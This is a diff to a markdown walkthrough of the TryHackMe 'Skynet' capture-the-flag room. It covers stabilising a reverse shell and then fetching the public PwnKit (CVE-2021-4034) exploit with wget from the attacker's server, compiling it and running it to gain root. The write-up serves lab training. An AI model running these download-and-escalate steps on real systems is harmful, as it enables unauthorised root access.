@@ -1,4 +1,4 @@
-![image](https://github.com/w1r3dup/ctf_writeups/assets/153192531/4207ee12-0afe-49a5-a257-a7f9892da74b)<h1 align="center">TryHackMe Tutorial</h1>
+<h1 align="center">TryHackMe Tutorial</h1>
 <h2 align="center">Skynet<br>Room link: https://tryhackme.com/room/skynet</h2>
 
 <h3 align="center">Dedicated to all the legends on our Discord channel - CyberSamurai</h3><br>
@@ -413,15 +413,19 @@ First, let's stabalise the shell. This is something I've learned in another CTF 
 
 ```bash
 export TERM=xterm
+```
 
-which python3
-
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
 
-Press CTRL + Z
+<p>Press CTRL + Z</p>
 
+```bash
 stty raw -echo ; fg
+```
 
+```bash
 reset
 ```
 
@@ -484,7 +488,51 @@ From what I've learned before, this version of Sudo may be vulnerable to a PwnKi
 
 Open a new terminal window and ```git clone``` the code from that link like I've shown before. Make sure it's in the same place where you have the HTTP Server running.<br>
 
-Go back to the shell window and download it using the below command:
+<p>Go back to the shell window and download it using the below command:</p>
+
+```bash
+wget -r -nH http://[yourIP]/CVE-2021-4034
+```
+
+<p align="center"> <img src="./images/60.png"></p><br>
+
+<p>Now to test if this works, all we need to do is run a command to compile the scripts inside and run the exploit.</p>
+
+```bash
+make
+```
+
+```bash
+./cve-2021-4034
+```
+
+<p align="center"> <img src="./images/61.png"></p><br>
+
+This looks like it worked! Let's ```whoami``` and see if we are indeed root.<br>
+
+<p align="center"> <img src="./images/62.png"></p><br>
+
+It worked ! We are **root !**<br>
+
+Now look for the *root.txt* file on your own, which is easy to find.<br>
+
+<p align="center"> <img src="./images/63.png"></p><br>
+
+**This will answer the 5th and final CTF question:**
+
+<p align="center"> <img src="./images/64.png"></p><br>
+
+
+**That's it!** You successfully exploited the server.<br>
+<br>
+
+
+<p>-----------------</p>
+
+**w12r3dup**<br>
+
+*~/cybersamurai$*
+
 
 
 
